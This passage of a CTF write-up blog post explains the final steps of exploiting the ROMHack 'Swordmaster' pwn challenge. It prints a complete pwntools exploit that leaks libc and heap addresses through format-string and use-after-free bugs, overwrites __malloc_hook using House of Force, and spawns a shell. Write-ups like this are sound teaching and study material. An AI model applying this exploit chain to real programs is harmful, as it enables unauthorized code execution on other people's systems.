</pre></table></code></div></div><p>Now we need to corrupt the top chunk size. We can do this programmatically the same way we did manually earlier:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span><span class="o">*</span><span class="mi">47</span><span class="p">)</span>
</pre></table></code></div></div><p>Next, we want to malloc all the way up to just before <code class="language-plaintext highlighter-rouge">__malloc_hook</code>. We can do so by doing the following: <code class="language-plaintext highlighter-rouge">__malloc_hook address - (heap base + already allocated space) - 0x10</code>. Looking at the current state of our heap at this point in the exploit, we see the following:</p><p><img data-src="/assets/img/img_swordmaster/heap_mid_exploit.png" alt="heap mid exploit" data-proofer-ignore></p><p>Adding all the allocated sizes together, we get <code class="language-plaintext highlighter-rouge">0x250 + 0x1010 + 0x30 + 0x30 + 0x30 + 0x30 = 0x1320</code>. We also need to add an additional <code class="language-plaintext highlighter-rouge">0x10</code> since we are using the heap base, which is <code class="language-plaintext highlighter-rouge">0x10</code> before the first chunk on the heap. Therefore we have the following code:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">distance</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1330</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>  
<span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="s">'dummy'</span><span class="p">)</span>
</pre></table></code></div></div><p>Note that we subtract <code class="language-plaintext highlighter-rouge">0x10</code> so that we get a pointer just before <code class="language-plaintext highlighter-rouge">__malloc_hook</code>. Therefore, on the next call to malloc, the allocator will return a pointer to <code class="language-plaintext highlighter-rouge">__malloc_hook</code>.</p><h3 id="step-5"><span class="mr-2">Step 5:</span><a href="#step-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Almost there, we need to call malloc another time. The data we include in this call will overwrite the <code class="language-plaintext highlighter-rouge">__malloc_hook</code>. Therefore, we use the following code:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
</pre></table></code></div></div><h3 id="step-6"><span class="mr-2">Step 6:</span><a href="#step-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Last step, we need to get a pointer to our name, <code class="language-plaintext highlighter-rouge">/bin/sh\0</code>. This is always located <code class="language-plaintext highlighter-rouge">0x1270</code> from the heap base. Instead of providing a size when crafting a sword, we will provide this pointer. Now instead of <code class="language-plaintext highlighter-rouge">__malloc_hook</code> running before the malloc takes place, <code class="language-plaintext highlighter-rouge">system("/bin/sh\0")</code> will run resulting in a shell.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">cmd</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1270</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
</pre></table></code></div></div><h3 id="full-exploit-code"><span class="mr-2">Full Exploit Code:</span><a href="#full-exploit-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The full exploit is included below. You can also view it on my <a href="https://github.com/stigward/PoCs-and-Exploits/tree/main/CTFs/ROMHack2022/swordmaster">github</a>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  
<span class="kn">import</span> <span class="nn">sys</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">sys</span><span class="p">.</span><span class="n">warnoptions</span><span class="p">:</span>  
  <span class="kn">import</span> <span class="nn">warnings</span>  
  <span class="n">warnings</span><span class="p">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>  
  
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./swordmaster"</span><span class="p">)</span>  
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./glibc/libc.so.6"</span><span class="p">)</span>  
<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="s">'./glibc/ld-linux-x86-64.so.2'</span><span class="p">,</span><span class="s">'./swordmaster'</span><span class="p">],</span><span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD\_PRELOAD"</span><span class="p">:</span><span class="s">"./glibc/libc.so.6"</span><span class="p">})</span>  
  
<span class="c1"># ---- SET NAME ----  
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>  
  
<span class="c1"># ---- LEAK LIBC BASE WITH FORMAT STRING BUG ----  
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'%13$p'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'There is no '</span><span class="p">)</span>  
  
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  
<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x21c87</span>  
  
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAKED LIBC BASE: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>  
  
  
<span class="c1"># ---- LEAK HEAP BASE WITH UAF BUG -------  
</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Class: '</span><span class="p">)</span>  
  
<span class="n">heap</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  
<span class="n">heap</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4800</span> <span class="o">-</span> <span class="mh">0x10</span>  
  
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAKED HEAP BASE: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>  
  
<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>  
  
  
  
<span class="c1"># ---- House Of Force Set-Up ----  
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x41</span><span class="s">'</span><span class="o">*</span><span class="mi">47</span><span class="p">)</span>  
  
<span class="c1"># ---- Point top chunk to __malloc_hook ----  
</span><span class="n">distance</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1330</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>  
<span class="n">malloc</span><span class="p">(</span><span class="n">distance</span><span class="p">,</span> <span class="s">'dummy'</span><span class="p">)</span>  
  
<span class="c1"># ---- Overwrite __malloc_hook with system ----  
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>  
  
<span class="c1"># ---- Point cmd at our name (/bin/sh) and call malloc to execute our overwritten hook ----  
</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x1270</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>  
  
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/img/img_swordmaster/exploit_success.png" alt="full exploit" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pwn/'>PWN</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/heap/" class="post-tag no-text-decoration" >heap</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=UAF+and+House+Of+Force+Fun+-+ROMHack+CTF+Swordmaster+Pwn+Challenge+-+Stigward%27s+Security+Journal&url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fswordmaster-pwn-chal%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=UAF+and+House+Of+Force+Fun+-+ROMHack+CTF+Swordmaster+Pwn+Challenge+-+Stigward%27s+Security+Journal&u=https%3A%2F%2Fstigward.github.io%2Fposts%2Fswordmaster-pwn-chal%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fswordmaster-pwn-chal%2F&text=UAF+and+House+Of+Force+Fun+-+ROMHack+CTF+Swordmaster+Pwn+Challenge+-+Stigward%27s+Security+Journal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/fiio-m6-exploit/">Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</a><li><a href="/posts/fiio-m6-kernel-bug/">Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</a><li><a href="/posts/swordmaster-pwn-chal/">UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/naughty-or-nice-web-chal/"><div class="card-body"> <em class="small" data-ts="1639107180" data-df="ll" > Dec 9, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge</h3><div class="text-muted small"><p> Naughty Or Nice Web Challenge TL;DR: Getting the flag on this challenge requires two separate steps. First, we must obtain access to the admin account by exploiting a flaw in the JWT verification...</p></div></div></a></div><div class="card"> <a href="/posts/fiio-m6-exploit/"><div class="card-body"> <em class="small" data-ts="1679974380" data-df="ll" > Mar 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</h3><div class="text-muted small"><p> Overview: A little over a month ago, I wrote a blog post detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap: T...</p></div></div></a></div><div class="card"> <a href="/posts/fiio-m6-kernel-bug/"><div class="card-body"> <em class="small" data-ts="1676777580" data-df="ll" > Feb 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</h3><div class="text-muted small"><p> Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the dev...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/wavlink-command-injection/" class="btn btn-outline-primary" prompt="Older"><p>Wavlink Command Injection - CVE-2022-23900</p></a> <a href="/posts/fiio-m6-kernel-bug/" class="btn btn-outline-primary" prompt="Newer"><p>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_stigward">Stigward</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QK87P1LVPH'); }); </script>
